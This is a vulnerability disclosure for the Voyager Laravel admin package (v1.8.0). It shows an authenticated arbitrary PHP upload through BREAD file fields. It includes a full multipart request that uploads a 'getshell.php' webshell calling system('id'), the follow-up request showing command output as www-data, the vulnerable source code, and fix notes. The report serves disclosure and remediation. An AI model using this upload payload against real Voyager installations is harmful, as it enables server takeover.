### Vulnerability details

**Official website / Product:** https://voyager.devdojo.com/ / https://github.com/thedevdojo/voyager

**Repository:** thedevdojo/voyager (stars at selection: 11784)

**Vulnerability type:** file_upload / getshell (BREAD `file` field missing extension controls → arbitrary PHP upload and RCE)

**Vulnerability versions:** tcg/voyager **1.8.0** (tag `v1.8.0` / commit `3b0c42d8cf966543ac89bc37017ebfd8260da0bc`); `ContentTypes/File.php` still has no MIME/extension denylist on this last release

**Vulnerability URL / Parameter:** `POST /admin/{bread-slug}` (example: `/admin/posts`) multipart field `{file_field}[]` (example: `attachment[]`); sink `TCG\Voyager\Http\Controllers\ContentTypes\File::handle()`

**Complex:** yes

### Verification procedure

1. Start the lab (original `labs/voyager-r61-a5/`; post-audit image `voyager-r61-a5:latest` was removed — rebuild an equivalent stack with `tcg/voyager` tag `v1.8.0` / commit `3b0c42d8`, Laravel 11 + MySQL 8 + PHP 8.4 Apache, and run `php artisan storage:link` so `public/storage` → `storage/app/public`). Verified topology: app container `voyager-r61-a5-app-1` (entry `/entrypoint.sh apache…`), DB `mysql:8.0` (container `voyager-r61-a5-db-1`; app starts after DB healthy), host port **24105 → container 80**. After `docker compose up -d`, expect something like:

```text
Network voyager-r61-a5_default  Created
Container voyager-r61-a5-db-1  Created
Container voyager-r61-a5-app-1  Created
Container voyager-r61-a5-db-1  Started
Container voyager-r61-a5-db-1  Healthy
Container voyager-r61-a5-app-1  Started

NAME                   IMAGE                   COMMAND                  SERVICE   STATUS                   PORTS
voyager-r61-a5-app-1   voyager-r61-a5:latest   "/entrypoint.sh apac…"   app       Up                       0.0.0.0:24105->80/tcp
voyager-r61-a5-db-1    mysql:8.0               "docker-entrypoint.s…"   db        Up (healthy)             3306/tcp
```

2. Admin credentials: `admin@admin.com` / `password`; open `http://127.0.0.1:24105/admin/login`.
3. Ensure the target BREAD has a `type=file` data row (first-class Voyager field; lab added `attachment` on posts to exercise the same handler; any BREAD/Settings file field is affected).
4. Obtain session cookies (`XSRF-TOKEN`, `laravel_session`) and form `_token`. Cookie/`_token` values in the PoC below are from the captured session — **replace with a fresh session when reproducing**, or Laravel returns 419 / redirects to login.
5. `POST /admin/posts` (multipart) uploading `getshell.php` (`<?php echo "R61A5_BREAD_FILE_RCE"; echo "|uid=".getmyuid(); system("id"); ?>`) on field `attachment[]`.
6. Follow the **302** `Location: /admin/posts`. On-disk path is `generatePath()` = `{slug}/` + `date('FY')` + `/` (e.g. `posts/November2026/`) + `Str::random(20)` + client original extension; web URL `/storage/posts/November2026/<random>.php`. Alternatively read `download_link` from the posts row `attachment` JSON.
7. `GET /storage/posts/November2026/<random>.php` and observe `R61A5_BREAD_FILE_RCE` plus `uid=33(www-data)`.

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /admin/posts HTTP/1.1
Host: 127.0.0.1:24105
User-Agent: Mozilla/5.0 (X11; Linux x86_64) PoC-r61-a5
Accept: text/html,application/xhtml+xml
Cookie: XSRF-TOKEN=eyJpdiI6InREeWxLeXBpQlBmKzU2akJZTVR6SVE9PSIsInZhbHVlIjoiYUFEbVlFRTF0QjdyNUU5M0xEQk40ZVRtdWxuRjNWcG5MNmhqa09YYUJTbGh0eFJ1SDA3aVhVZGJVMk5HcC9LNm9zR1ZCY1hWZW5CL3hDdm45ODdGTXU2QlEwR3pYQTRFRlhLelR6VG9CcllEV2N4R21Hb2hJRUl5WnIxNGx2b2ciLCJtYWMiOiJhMWVmYWNiZmU2MmQ0ODczM2M0NDliYzM2ZGYxZTU5NTliNTdlNTlmMjlkMzA5ZGRmMWIxMWEzY2QwMTAyZDMyIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IlJRZGp5UGJ0ZHBaK0d2WG8vSW5qK3c9PSIsInZhbHVlIjoiSTVuczBVZy9CWGFhL0VYUUU1T2FCMTEveWZvV20rRUs2WlBZWVFORlZ2TTFKQm56MFUvMEFFMzZlMnY3ZllOamM3aHBQT3RPdkxOTllYeGZhY1U0eDJiK2VRZ2t1c2NybmRNRXZGazZiOEhpblF2NkNHQlV3THJhSjBLWW51QysiLCJtYWMiOiJkMDE2NTA1ODZkNDY3NDM2YWUwZTEzODQyZTU5YmU0Y2I5YTYyODkxMzE5NzQzNDQ4NDMxNWFlMjY2MzhiMWFlIiwidGFnIjoiIn0%3D
Content-Length: 1434
Content-Type: multipart/form-data; boundary=103b683d5efff18d5d3eb09a8d96a4b0

--103b683d5efff18d5d3eb09a8d96a4b0
Content-Disposition: form-data; name="_token"

N3ywyPFtaaXwJwV3DymHzOsqoFjEQR0kaWwrXlbL
--103b683d5efff18d5d3eb09a8d96a4b0
Content-Disposition: form-data; name="author_id"

1
--103b683d5efff18d5d3eb09a8d96a4b0
Content-Disposition: form-data; name="category_id"

1
--103b683d5efff18d5d3eb09a8d96a4b0
Content-Disposition: form-data; name="title"

r61a5-poc2
--103b683d5efff18d5d3eb09a8d96a4b0
Content-Disposition: form-data; name="seo_title"

r61a5
--103b683d5efff18d5d3eb09a8d96a4b0
Content-Disposition: form-data; name="excerpt"

poc
--103b683d5efff18d5d3eb09a8d96a4b0
Content-Disposition: form-data; name="body"

<p>poc</p>
--103b683d5efff18d5d3eb09a8d96a4b0
Content-Disposition: form-data; name="slug"

r61a5-poc2
--103b683d5efff18d5d3eb09a8d96a4b0
Content-Disposition: form-data; name="meta_description"

x
--103b683d5efff18d5d3eb09a8d96a4b0
Content-Disposition: form-data; name="meta_keywords"

x
--103b683d5efff18d5d3eb09a8d96a4b0
Content-Disposition: form-data; name="status"

PUBLISHED
--103b683d5efff18d5d3eb09a8d96a4b0
Content-Disposition: form-data; name="featured"

0
--103b683d5efff18d5d3eb09a8d96a4b0
Content-Disposition: form-data; name="attachment[]"; filename="getshell.php"
Content-Type: application/octet-stream

<?php echo "R61A5_BREAD_FILE_RCE"; echo "|uid=".getmyuid(); system("id"); ?>
--103b683d5efff18d5d3eb09a8d96a4b0--

```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 302 Found
Date: Mon, 02 Nov 2026 15:46:08 GMT
Server: Apache/2.4.68 (Debian)
X-Powered-By: PHP/8.4.27
Cache-Control: no-cache, private
Location: http://127.0.0.1:24105/admin/posts
Set-Cookie: XSRF-TOKEN=eyJpdiI6ImI5K2pJTmZDK0FHSjQyTFpNS1duOGc9PSIsInZhbHVlIjoiNy9QOURsa2lVelM3RUV0Ymw0aGM3LzdleGRzaHFUQ3MrZFVGNDB6cnhOYTMzSkpOZU1LcnY4ZG1qcXFzZ2tZWTUyb1g3cHZhVXBocmJXRE5sWUlmNDN5N280K3F3ZTJHMHgvU056U0IwTlh2emFjUmZ6SER2NFJCZjNCR3M1S1UiLCJtYWMiOiI4NDQxMDg1Mzk2MGEzNjg1ZTBjNzllMjI2ZmIxY2RlYjI1NDc1ZGEyM2JjYWYzZDg1ZTU5ZmE3MDNkMGRkZjRjIiwidGFnIjoiIn0%3D; expires=Mon, 02 Nov 2026 17:46:08 GMT; Max-Age=7200; path=/; samesite=lax, laravel_session=eyJpdiI6Ilc1UDdpd2Q2RW1YWVZEWXlpamVQNFE9PSIsInZhbHVlIjoiWkdRVW4xSEd2Y093a08vMC9aU1RqWkVQUE5TV29DeUFRbmhZc3g5RmV5SENkbWJYaFNLRmdheDgrVGcrRWVqMEtkYnhpbzdZbmdpY3hmTXliSXA0NGFQWE43TXFJbzc5ZTNNSHFjaEVCQ2N1TFZ1b3VocWl0WmdMRnl4YldORkEiLCJtYWMiOiIzNzI3YjU4MjUxMTExMDJhOTE0MjM4OTM3NzFjMjRjMDUyZjlmN2UwZjQ4YmM4ZDIyZDM1MjllYzk4NmYwNDRiIiwidGFnIjoiIn0%3D; expires=Mon, 02 Nov 2026 17:46:08 GMT; Max-Age=7200; path=/; httponly; samesite=lax
Keep-Alive: timeout=5, max=96
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html; charset=utf-8

<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="refresh" content="0;url='http://127.0.0.1:24105/admin/posts'" />

        <title>Redirecting to http://127.0.0.1:24105/admin/posts</title>
    </head>
    <body>
        Redirecting to <a href="http://127.0.0.1:24105/admin/posts">http://127.0.0.1:24105/admin/posts</a>.
    </body>
</html>
```

Follow-up webshell request (impact proof):

```http
GET /storage/posts/November2026/G1pZj1fsfccRMCUoj6pv.php HTTP/1.1
Host: 127.0.0.1:24105
User-Agent: Mozilla/5.0 PoC-r61-a5
Accept: */*

```

Complete webshell response:

```http
HTTP/1.1 200 OK
Date: Mon, 02 Nov 2026 15:46:08 GMT
Server: Apache/2.4.68 (Debian)
X-Powered-By: PHP/8.4.27
Vary: Accept-Encoding
Content-Encoding: gzip
Keep-Alive: timeout=5, max=95
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

R61A5_BREAD_FILE_RCE|uid=33uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

Verification result notes:

Upload returns **302** to `/admin/posts`. The posts.attachment JSON stores `download_link=posts/November2026/G1pZj1fsfccRMCUoj6pv.php`. Fetching `/storage/posts/November2026/G1pZj1fsfccRMCUoj6pv.php` returns **200**, matching the verified impact:

```text
URL: http://127.0.0.1:24105/storage/posts/November2026/G1pZj1fsfccRMCUoj6pv.php
STATUS: 200

R61A5_BREAD_FILE_RCE|uid=33uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This proves arbitrary PHP upload and execution under the web root (getshell).

### Vulnerability analysis

Voyager BREAD `file` fields are handled by `ContentTypes/File.php`. `handle()` calls `storeAs($path, $filename.'.'.$file->getClientOriginalExtension(), ...)` and **fully trusts the client-supplied extension**. There is no MIME allowlist and no denylist for dangerous suffixes such as `.php`/`.phtml`/`.phar`. Files land on the `public` disk (`storage/app/public`), exposed via the `public/storage` symlink. Under default Apache/PHP, those `.php` objects are executed.

Path rules: `generatePath()` → `$this->slug.DIRECTORY_SEPARATOR.date('FY').DIRECTORY_SEPARATOR`; default filename `Str::random(20)` unless BREAD options set `preserveFileUploadName`.

This is a **different sink** from known `/admin/media/upload` (CVE-2024-55417) and TinyMCE `VoyagerController::upload` (public PacketStorm PoC). It does not require `browse_media`; only add/edit on a BREAD that includes a `file` row.

Trigger / sink source (full path and line numbers):

```php
# File: src/Http/Controllers/ContentTypes/File.php
# Lines: 14-39 (handle); path 45-48; filename 53-73
    public function handle()
    {
        if (!$this->request->hasFile($this->row->field)) {
            return;
        }

        $files = Arr::wrap($this->request->file($this->row->field));

        $filesPath = [];
        $path = $this->generatePath();

        foreach ($files as $file) {
            $filename = $this->generateFileName($file, $path);
            $file->storeAs(
                $path,
                $filename.'.'.$file->getClientOriginalExtension(),
                config('voyager.storage.disk', 'public')
            );

            array_push($filesPath, [
                'download_link' => $path.$filename.'.'.$file->getClientOriginalExtension(),
                'original_name' => $file->getClientOriginalName(),
            ]);
        }

        return json_encode($filesPath);
    }
```

### Fix notes

1. Enforce a server-side extension allowlist for `file` fields (or at least denylist `php,phtml,phar,php5,pht,shtml`, etc.).
2. Persist using a server-chosen safe extension; ignore `getClientOriginalExtension()` for the stored name.
3. Do not serve the upload directory with PHP execution enabled (`php_flag engine off` on `public/storage`, or store outside the web root).
4. Validate MIME/magic bytes without trusting client Content-Type.
